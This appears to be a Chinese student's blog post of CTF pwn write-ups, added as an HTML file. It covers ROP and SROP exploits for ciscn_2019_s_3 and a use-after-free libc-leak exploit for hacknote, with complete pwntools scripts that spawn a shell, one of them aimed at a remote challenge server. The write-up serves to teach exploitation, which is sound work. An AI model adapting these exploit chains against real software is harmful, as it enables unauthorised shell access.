@@ -1,0 +1,200 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>胡礼--第八周笔记 | Pdxbshx</title><meta name="author" content="pdxbshx"><meta name="copyright" content="pdxbshx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ciscn_2019_s_3（系统调用）第一种解法：首先对程序进行分析：  放入ida中反编译：   仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。 我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="胡礼--第八周笔记">
+<meta property="og:url" content="http://pdxbshx.top/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Pdxbshx">
+<meta property="og:description" content="ciscn_2019_s_3（系统调用）第一种解法：首先对程序进行分析：  放入ida中反编译：   仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。 我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-09T17:10:53.160Z">
+<meta property="article:modified_time" content="2022-11-09T17:35:40.489Z">
+<meta property="article:author" content="pdxbshx">
+<meta name="twitter:card" content="summary"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://pdxbshx.top/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '胡礼--第八周笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-11-10 01:35:40'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/a.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Pdxbshx</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">胡礼--第八周笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-09T17:10:53.160Z" title="发表于 2022-11-10 01:10:53">2022-11-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-09T17:35:40.489Z" title="更新于 2022-11-10 01:35:40">2022-11-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="胡礼--第八周笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ciscn-2019-s-3（系统调用）"><a href="#ciscn-2019-s-3（系统调用）" class="headerlink" title="ciscn_2019_s_3（系统调用）"></a>ciscn_2019_s_3（系统调用）</h1><h2 id="第一种解法："><a href="#第一种解法：" class="headerlink" title="第一种解法："></a>第一种解法：</h2><p>首先对程序进行分析：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-1.png"></p>
+<p>放入ida中反编译：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-2.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-3.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-4.png"></p>
+<p>仔细看了一遍整个程序，发现是系统调用的类型，之前没有接触过，这就让我很头疼，慢慢搜集资料仔细分析一波。</p>
+<p>我们发现在地址0x00400517地址处，调用了execve函数，因此我们可以使用execve(&#x2F;bin&#x2F;sh,0,0)来获取我们的flag，此时我们需要的参数对应的寄存器为rax&#x3D;&#x3D;59，rdi&#x3D;&#x3D;’&#x2F;bin&#x2F;sh’，rsi&#x3D;&#x3D;0,  rdx&#x3D;&#x3D;0,  syscall.</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-5.png"></p>
+<p>查看pop rdi的地址</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-6.png"></p>
+<p>然后我们可以调试一下程序，找到我们输入的&#x2F;bin&#x2F;sh的地址：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-7.png"></p>
+<p>我们可以分析得出栈基址为0x7fffffffe068,然后由此我们可以计算出输入的地址的偏移为e068-df20&#x3D;0x148，由此我们确定了&#x2F;bin&#x2F;sh的位置，也知道到了pop rdi指令的地址，然后我们需要使rdx&#x3D;&#x3D;0，但是我们并没有找到可以使pop rdx的指令，只有mov rdx , r13的指令，所以我们接着要对r13进行赋值，这里有个知识点需要注意，call【r12+rbx*8】当rbx&#x3D;0的时候就会 跳转到r12的位置，可以跳转到后面的rop继续执行</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-8.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-9.png"></p>
+<p>构造的脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,29304)</span></span><br><span class="line">vuln=<span class="number">0x4004ed</span></span><br><span class="line">pop_rdi=<span class="number">0x4005a3</span></span><br><span class="line">pop_regs=<span class="number">0x40059a</span></span><br><span class="line">mov_addr=<span class="number">0x400580</span></span><br><span class="line">mov_rax=<span class="number">0x4004e2</span></span><br><span class="line">syscall=<span class="number">0x400517</span></span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(vuln)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr=u64(p.recv(<span class="number">8</span>))-<span class="number">0x148</span></span><br><span class="line">payload2=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(pop_regs)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(binsh_addr+<span class="number">0x50</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(mov_addr)+p64(pop_rdi)+p64(binsh_addr)+p64(mov_rax)+p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>在本地打通的结果如下所示：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-10.png"></p>
+<p>需要注意的是我们在本地这里的&#x2F;bin&#x2F;sh的地址相对偏移是0x148，而在我们远地要想打通的话，得将0x148改成0x138或者是0x118，反正就是这两个一直在换，否则的话打不通。</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-11.png"></p>
+<h2 id="第二种解法："><a href="#第二种解法：" class="headerlink" title="第二种解法："></a>第二种解法：</h2><h3 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h3><p>这里简单介绍下SROP的概念，主要是帮助读者理解和使用pwntools提供的SigreturnFrame工具实现漏洞利用。</p>
+<p>  我们都知道ROP吧，即利用.text段中的gadgets，这些gadgets都以ret指令作为结尾，以此串联起来实现我们想要的系统调用进而达到获取目标主机shell的目的。那么如何判断是哪种系统调用呢？这里是根据寄存器的值来进行判断的，只要将相应的寄存器值设置为对应参数，然后执行syscall或者int 80指令就可以实现相应的函数功能。这里推荐一个实现系统调用如何设置寄存器对应参数的网站（<a target="_blank" rel="noopener" href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/%EF%BC%89%E5%92%8C%E4%B8%80%E4%B8%AA%E5%85%B7%E4%BD%93%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A%E8%AE%BE%E7%BD%AE%E5%AF%84%E5%AD%98%E5%99%A8%E5%AE%9E%E7%8E%B0execve%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%88https://blog.csdn.net/A951860555/article/details/110936441%EF%BC%89%E3%80%82">http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/）和一个具体的例子：设置寄存器实现execve系统调用的博客（https://blog.csdn.net/A951860555/article/details/110936441）。</a></p>
+<p>  好了，究其本质，ROP方法的思路都是通过gadgets设置寄存器的值来实现漏洞利用的，SROP也是从属于ROP方法中的一员。它利用了Linux系统信号处理过程中的漏洞，即在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。sigreturn系统调用就是处理完后那一阶段执行的系统调用，它会读取当前栈空间中的数据作为寄存器的值。因此这里我们利用栈溢出漏洞和sigreturn系统调用就可以实现SROP的攻击方法。首先利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP&#x2F;ESP和RIP&#x2F;EIP都会被改变，所以SROP强大之处就是改变了所有的寄存器，这可以让我们实现任何想要的系统调用，但附带效果就是会改变栈顶指针RSP&#x2F;ESP，有时候这并不是我们想要的。</p>
+<h3 id="SigreturnFrame的使用"><a href="#SigreturnFrame的使用" class="headerlink" title="SigreturnFrame的使用"></a>SigreturnFrame的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="comment"># sigreturn 代表可以触发sigreturn调用的地址</span></span><br><span class="line"><span class="comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x001 mov rax, 0Fh</span></span><br><span class="line"><span class="string">0x002 syscall</span></span><br><span class="line"><span class="string">0x003 ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sigreturn = <span class="number">0x001</span></span><br><span class="line">syscall = <span class="number">0x002</span>  <span class="comment"># syscall gadget</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">pad = padding + <span class="built_in">bytes</span>(frame)  <span class="comment"># python3</span></span><br><span class="line">p.send(pad)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位注意以下几个方面</span></span><br><span class="line"><span class="comment"># 1、上下文初始化</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"><span class="comment"># frame = SigreturnFrame(kernel=&quot;i386&quot;)</span></span><br><span class="line"><span class="comment"># 2、frame.eax = xx  注意寄存器的名字</span></span><br><span class="line"><span class="comment"># 3、syscall指令在32位下可以找int 80</span></span><br></pre></td></tr></table></figure>
+
+<p>根据葫芦画瓢，我们构造的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">sigreturn=<span class="number">0x4004da</span> <span class="comment">#mov rax,0fh</span></span><br><span class="line">read_write=<span class="number">0x4004f1</span></span><br><span class="line">system_call=<span class="number">0x400517</span> </span><br><span class="line">payload1=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)+p64(read_write)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">sh_addr=u64(p.recv(<span class="number">8</span>))-<span class="number">0x148</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=system_call</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sigreturn)+p64(system_call)+<span class="built_in">bytes</span>(frame)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>在本地打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-12.png"></p>
+<h2 id="有关系统调用的知识点"><a href="#有关系统调用的知识点" class="headerlink" title="有关系统调用的知识点"></a>有关系统调用的知识点</h2><p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-13.png"></p>
+<h1 id="hacknote-UAF"><a href="#hacknote-UAF" class="headerlink" title="hacknote(UAF)"></a>hacknote(UAF)</h1><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>首先对程序进行检查：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-14.png"></p>
+<p>32位程序，开启了NX保护和canary保护，将程序放入ida中反编译：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-15.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-16.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-17.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-18.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-19.png"></p>
+<p> 仔细分析一下程序，发现其整个流程就是选择note，然后在其中进行写入内容，这里我们可以注意到在delete note这个函数中没有只释放了chunk，和chunk中的内容，并没有对指针进行释放，这就导致了uaf，我们之后再申请其他chunk的时候之前申请chunk的指针依然可以被使用，题目文件中给了一个libc库，利用这一点，我们就可以来获取我们的flag。</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-20.png"></p>
+<p>然后我们开始构造脚本攻击：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./hacknote&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">54690</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Content :&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">addnote(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">delnote(<span class="number">0</span>)</span><br><span class="line">delnote(<span class="number">1</span>)</span><br><span class="line">puts_plt=<span class="number">0x804862B</span></span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">payload1 = p32(puts_plt)+p32(puts_got)</span><br><span class="line">addnote(<span class="number">0x8</span>,payload1)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">libc_base=u32(p.recv(<span class="number">4</span>))-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">delnote(<span class="number">2</span>)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">payload2 = p32(system_addr)+<span class="string">b&#x27;||sh&#x27;</span></span><br><span class="line">addnote(<span class="number">0x8</span>,payload2)</span><br><span class="line">printnote(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里其实有个小细节，也是我做题过程中遇到的问题，后来还是仔细地检查了一遍程序才发现问题所在：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-21.png"></p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-22.png"></p>
+<p>在我们申请的chunk中，第一个默认的是puts_self函数，第二是我们填写到chunk里的内容，当我们进行print note的时候，会打印出以自身地址为参数的值，接着我们可以找到如下这个函数：</p>
+<p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-23.png"></p>
+<p>可以运用这个函数打印出puts函数在got表中的地址，然后与libc库匹配，进而找到system函数！</p>
+<p>打通的结果如下：<br><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/8-24.png"></p>
+<h2 id="uaf介绍"><a href="#uaf介绍" class="headerlink" title="uaf介绍"></a>uaf介绍</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况：</p>
+<p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p>
+<p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</p>
+<p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
+<p>而我们一般所指的 Use After Free 漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</p>
+<h2 id="推荐网址"><a href="#推荐网址" class="headerlink" title="推荐网址"></a>推荐网址</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45943522/article/details/113919759">https://blog.csdn.net/weixin_45943522/article/details/113919759</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/539338507">https://zhuanlan.zhihu.com/p/539338507</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://pdxbshx.top">pdxbshx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://pdxbshx.top/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/">http://pdxbshx.top/uncategorized/%E8%83%A1%E7%A4%BC--%E7%AC%AC%E5%85%AB%E5%91%A8%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://pdxbshx.top" target="_blank">Pdxbshx</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" 